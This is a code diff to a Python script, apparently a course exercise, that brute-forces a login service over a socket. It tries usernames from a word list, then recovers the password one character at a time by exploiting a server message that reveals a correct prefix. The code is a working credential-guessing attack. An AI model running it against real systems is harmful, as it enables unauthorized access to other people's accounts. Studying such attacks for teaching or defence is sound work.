@@ -2,6 +2,7 @@ import argparse
 import socket
 import itertools
 import string
+import json
 
 
 def main():
@@ -13,17 +14,49 @@ def main():
 
     with socket.socket() as client_socket:
         client_socket.connect((args.hostname, args.port))
-        answer = 'Wrong password!'
+        result = 'Wrong login!'
         if args.message:
             client_socket.send(args.message.encode())
-            answer = client_socket.recv(1024).decode()
-        if answer == 'Wrong password!':
-            for password in dictionary_based_brute_force_passwords():
-                client_socket.send(password.encode())
-                answer = client_socket.recv(1024).decode()
-                if answer == 'Connection success!':
-                    print(password)
+            result = get_result_from_server(client_socket)
+        if result == 'Wrong login!':
+            for login in dictionary_based_brute_force_logins():
+                client_socket.send(login_password_to_json(login).encode())
+                result = get_result_from_server(client_socket)
+                if result != 'Wrong login!':
                     break
+        if result != 'Connection success!':
+            password = ''
+            alphabet = alphabet_for_password()
+            while True:
+                ch = next(alphabet)
+                client_socket.send(login_password_to_json(login, password + ch).encode())
+                result = get_result_from_server(client_socket)
+                if result == 'Exception happened during login':
+                    password += ch
+                    alphabet = alphabet_for_password()
+                if result == 'Connection success!':
+                    password += ch
+                    break
+        print(login_password_to_json(login, password))
+
+
+def get_result_from_server(client_socket):
+    return json.loads(client_socket.recv(1024).decode())['result']
+
+
+def login_password_to_json(login='admin', password=''):
+    return json.dumps({'login': login, 'password': password})
+
+
+def alphabet_for_password():
+    for ch in itertools.chain(string.ascii_letters, string.digits):
+        yield ch
+
+
+def dictionary_based_brute_force_logins():
+    with open('logins.txt') as f:
+        for login in f:
+            yield login.strip()
 
 
 def dictionary_based_brute_force_passwords():
